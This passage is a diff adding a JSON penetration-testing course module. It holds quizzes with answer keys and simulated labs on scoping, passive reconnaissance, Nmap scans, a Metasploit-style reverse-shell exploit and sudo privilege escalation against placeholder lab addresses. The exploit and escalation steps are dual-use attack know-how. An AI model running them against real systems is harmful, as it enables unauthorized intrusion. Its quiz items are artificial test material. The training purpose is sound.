+      "The report to be shorter",
+      "Faster scanning"
+     ],
+     "a": 1,
+     "why": "Clear steps let the client's own team validate and retest."
+    },
+    {
+     "q": "Why group related findings under one remediation task?",
+     "options": [
+      "To hide issues",
+      "Because one fix, such as a framework upgrade, can close several findings",
+      "To raise the price",
+      "To avoid retesting"
+     ],
+     "a": 1,
+     "why": "Grouping efficient fixes reduces duplicate engineering work."
+    },
+    {
+     "q": "What typically follows report delivery?",
+     "options": [
+      "Nothing further",
+      "A readout meeting and often a retest",
+      "Immediate public disclosure",
+      "Deleting all evidence"
+     ],
+     "a": 1,
+     "why": "Walking through findings and retesting fixes are standard follow-ups."
+    }
+   ],
+   "recap": [
+    "Structure reports for both executive and technical readers.",
+    "Write clear, reproducible findings with ranked, specific remediation.",
+    "Deliver securely, hold a readout, and retest fixes."
+   ]
+  }
+ ],
+ "labs": [
+  {
+   "title": "Check scope before testing",
+   "sim": "scenario",
+   "scenario": "You are given a signed rules-of-engagement document for Example Corp listing in-scope ranges, allowed techniques and a testing window, plus a list of eight possible actions.",
+   "objective": "Decide which of the eight actions are in scope and which are out of scope.",
+   "steps": [
+    {
+     "do": "Read the RoE: in-scope 198.51.100.0/28, allowed scanning and web testing, forbidden denial of service and social engineering, window 22:00-06:00 UTC.",
+     "see": "Document loaded in the scenario panel."
+    },
+    {
+     "do": "Review action 1: port scan 198.51.100.5 at 23:00 UTC.",
+     "see": "In scope: correct IP range and time window."
+    },
+    {
+     "do": "Review action 2: port scan 203.0.113.9 (not listed).",
+     "see": "Out of scope: IP range not listed."
+    },
+    {
+     "do": "Review action 3: send a phishing email to staff to test awareness.",
+     "see": "Out of scope: social engineering is forbidden."
+    },
+    {
+     "do": "Review action 4: run a heavy load test that could crash a server.",
+     "see": "Out of scope: resembles denial of service, forbidden."
+    },
+    {
+     "do": "Review action 5: enumerate web directories on test.example.com at 02:00 UTC.",
+     "see": "In scope: listed target, correct window."
+    },
+    {
+     "do": "Review the remaining three actions and submit your answers.",
+     "see": "Checker: 5 of 8 correctly marked in scope; 3 correctly marked out of scope."
+    }
+   ],
+   "answer": "In-scope actions are those against listed IP ranges or domains, using allowed techniques, within the testing window. Scanning an unlisted address, sending phishing emails, and load testing that could cause denial of service are all out of scope under this RoE and must not be performed without written approval to add them.",
+   "hint": "Check each action against the IP range, allowed techniques list and time window, not just plausibility."
+  },
+  {
+   "title": "Passive recon on a target",
+   "sim": "web-proxy",
+   "scenario": "Example Corp asked only for passive information gathering before the active phase begins. You have access to a web-proxy style OSINT simulator with search, DNS and certificate lookup panels.",
+   "objective": "Gather subdomains, emails and technology details from sandbox OSINT sources without touching the target.",
+   "steps": [
+    {
+     "do": "Search Certificate Transparency for example.com.",
+     "see": "Returns vpn.example.com, dev.example.com, old-portal.example.com."
+    },
+    {
+     "do": "Run a DNS lookup on dev.example.com.",
+     "see": "A record: 198.51.100.12; no AAAA."
+    },
+    {
+     "do": "Search a people/email finder for example.com staff.",
+     "see": "Finds 6 email addresses in format first.last@example.com."
+    },
+    {
+     "do": "Search job postings mentioning Example Corp technology.",
+     "see": "One posting mentions a specific content management system and a cloud provider."
+    },
+    {
+     "do": "Check whois for example.com registration details.",
+     "see": "Registrar and creation date shown; registrant identity redacted."
+    },
+    {
+     "do": "Compile the OSINT summary and submit.",
+     "see": "Checker: summary includes 3 subdomains, 6 emails, 1 CMS hint, no direct contact with hosts."
+    }
+   ],
+   "answer": "The OSINT summary lists three subdomains from Certificate Transparency, six staff email addresses in a consistent format useful for later authorized testing, and a technology hint from a job posting, all gathered without a single packet sent to the target's own infrastructure.",
+   "hint": "Favor public records, search engines and certificate logs over anything that touches the target directly."
+  },
+  {
+   "title": "Scan with Nmap",
+   "sim": "terminal",
+   "scenario": "You have authorization to scan the lab range 198.51.100.0/28 from a terminal simulator.",
+   "objective": "Run host discovery, a service scan and default scripts, then interpret the open ports and versions.",
+   "steps": [
+    {
+     "do": "Run: nmap -sn 198.51.100.0/28",
+     "see": "4 hosts up: .5, .10, .12, .14."
+    },
+    {
+     "do": "Run: nmap -sV -sC 198.51.100.10",
+     "see": "22/tcp ssh OpenSSH 8.4; 80/tcp http Apache 2.4.38; 445/tcp smb Samba 4.9.5."
+    },
+    {
+     "do": "Run: nmap -sV -sC 198.51.100.12",
+     "see": "80/tcp http nginx 1.18; 3306/tcp filtered mysql."
+    },
+    {
+     "do": "Read the http-title script output for .12.",
+     "see": "Title: 'Internal Dev Portal - staging'."
+    },
+    {
+     "do": "Run: nmap -sV -p- 198.51.100.14",
+     "see": "21/tcp ftp vsFTPd 2.3.4; anonymous login allowed per script note."
+    },
+    {
+     "do": "Summarize findings by host and risk.",
+     "see": "Checker: identifies outdated Apache, anonymous FTP and exposed dev portal as notable items."
+    }
+   ],
+   "answer": "Four hosts are live. Host .10 runs an aging Apache version and SMB; .12 exposes an internal-looking staging portal with a filtered database port behind it, which is good practice; .14 allows anonymous FTP login, a common and risky misconfiguration worth flagging as a finding.",
+   "hint": "Compare each open port's version against what you would expect for a hardened production host, and note anything marked anonymous or default."
+  },
+  {
+   "title": "Exploit a vulnerable service",
+   "sim": "terminal",
+   "scenario": "Within the agreed scope, a lab host at 192.0.2.70 runs a vulnerable service matched during scanning. You will use a sandboxed Metasploit-style console to confirm impact safely.",
+   "objective": "Select a matching module, set options correctly, and obtain a shell in the lab only.",
+   "steps": [
+    {
+     "do": "Run: search type:exploit examplehttpd",
+     "see": "One matching module: exploit/lab/examplehttpd_traversal."
+    },
+    {
+     "do": "Run: use exploit/lab/examplehttpd_traversal",
+     "see": "Module loaded; options listed: RHOSTS, RPORT, PAYLOAD, LHOST."
+    },
+    {
+     "do": "Run: set RHOSTS 192.0.2.70",
+     "see": "RHOSTS => 192.0.2.70."
+    },
+    {
+     "do": "Run: set PAYLOAD generic/shell_reverse_tcp",
+     "see": "PAYLOAD set."
+    },
+    {
+     "do": "Run: set LHOST 192.0.2.5",
+     "see": "LHOST => 192.0.2.5 (tester's lab address)."
+    },
+    {
+     "do": "Run: run",
+     "see": "Session 1 opened (sandbox only); low-privilege shell confirmed."
+    },
+    {
+     "do": "Run: sessions -l and record the result.",
+     "see": "1 active session logged with timestamp for the report."
+    }
+   ],
+   "answer": "Setting RHOSTS to the lab target and LHOST to the tester's own lab address, with a matching module and payload, produces a low-privilege shell confirming the path traversal flaw is exploitable. The session is recorded with a timestamp for the report and then closed; no destructive action is taken.",
+   "hint": "RHOSTS is always the target, LHOST is always the tester's own listening address."
+  },
+  {
+   "title": "Escalate privileges",
+   "sim": "terminal",
+   "scenario": "A low-privilege account on a lab host may be configured with unusual rights. You are asked to audit, not exploit further than necessary to confirm the risk.",
+   "objective": "Enumerate configured rights on a sandbox host and confirm whether elevated access is possible.",
+   "steps": [
+    {
+     "do": "Run: id",
+     "see": "uid=1001(labuser) gid=1001(labuser)."
+    },
+    {
+     "do": "Run: sudo -l",
+     "see": "Shows labuser may run one maintenance utility as root, NOPASSWD."
+    },
+    {
+     "do": "Look up the utility in a privilege-escalation reference inside the sim.",
+     "see": "Reference flags this utility as commonly abusable for a root shell."
+    },
+    {
+     "do": "Confirm in the lab whether elevated access results.",
+     "see": "Sandbox confirms: elevated shell obtained, uid=0."
+    },
+    {
+     "do": "Record the finding instead of exploring further.",
+     "see": "Finding logged: overly permissive sudo rule, CWE-269."
+    },
+    {
+     "do": "Exit the elevated shell and note cleanup needed.",
+     "see": "No persistent changes made; nothing to clean up."
+    }
+   ],
+   "answer": "The audit confirms that the sudo rule on one maintenance utility lets a low-privilege account obtain a root shell, matching a well-known privilege-escalation pattern (CWE-269, improper privilege management). The tester records the finding with evidence and recommends removing the NOPASSWD rule or replacing the utility with a restricted, logged wrapper, without exploring further than needed to confirm impact.",
+   "hint": "Check sudo rights first, then compare any unusual allowed program against known escalation references rather than guessing."
+  }
+ ],
+ "checkpoint": [
+  {
+   "q": "What document defines exactly which systems and techniques a tester may use?",
+   "options": [
+    "NDA",
+    "Rules of engagement",
+    "Resume",
+    "Press release"
+   ],
+   "a": 1,
+   "why": "The RoE sets the boundaries of the engagement."
+  },
+  {
+   "q": "A grey box test means the tester has:",
+   "options": [
+    "No information",
+    "Partial information such as an account or diagram",
+    "Full source code",
+    "Only a press release"
+   ],
+   "a": 1,
+   "why": "Grey box sits between black box and white box in prior knowledge."
+  },
+  {
+   "q": "Which PTES phase involves proving a weakness can actually be used?",
+   "options": [
+    "Reporting",
+    "Exploitation",
+    "Pre-engagement",
+    "Threat modeling"
+   ],
+   "a": 1,
+   "why": "Exploitation demonstrates real impact from a vulnerability."
+  },
+  {
+   "q": "Searching Certificate Transparency logs for subdomains is an example of:",
+   "options": [
+    "Active scanning",
+    "Passive reconnaissance",
+    "Exploitation",
+    "Post-exploitation"
+   ],
+   "a": 1,
+   "why": "It uses public records and does not touch the target."
+  },
+  {
+   "q": "Which Nmap option identifies service versions on open ports?",
+   "options": [
+    "-sn",
+    "-sV",
+    "-oA",
+    "-T0"
+   ],
+   "a": 1,
+   "why": "-sV performs service and version detection."
+  },
+  {
+   "q": "In Metasploit, which option specifies the tester's own listening address for a reverse shell?",
+   "options": [
+    "RHOSTS",
+    "LHOST",
+    "RPORT",
+    "PAYLOAD size"
+   ],
+   "a": 1,
+   "why": "LHOST is the local host the target connects back to."
+  },
+  {
+   "q": "Finding that a low-privilege account can run a risky program as root without a password relates to which post-exploitation activity?",
+   "options": [
+    "Reconnaissance",
+    "Privilege escalation",
+    "Reporting",
+    "Scoping"
+   ],
+   "a": 1,
+   "why": "This is a classic privilege escalation finding."
+  },
+  {
+   "q": "What should a tester do before using any destructive technique?",
+   "options": [
+    "Just try it",
+    "Confirm it is within the RoE and prefer the least risky proof",
+    "Disable logging",
+    "Skip scoping"
+   ],
+   "a": 1,
+   "why": "Safety and authorization come before risky actions."
+  },
+  {
+   "q": "A pentest report's executive summary is aimed at:",
+   "options": [
+    "Other testers only",
+    "Non-technical decision makers",
+    "Search engines",
+    "Attackers"
+   ],
+   "a": 1,
+   "why": "It communicates risk and priorities in plain language."
+  },
+  {
+   "q": "What usually follows delivery of a pentest report?",
+   "options": [
+    "Nothing",
+    "A readout meeting and often a retest",
+    "Immediate public release",
+    "Deleting the findings"
+   ],
+   "a": 1,
+   "why": "Clients review findings and verify fixes afterward."
+  }
+ ]
+}
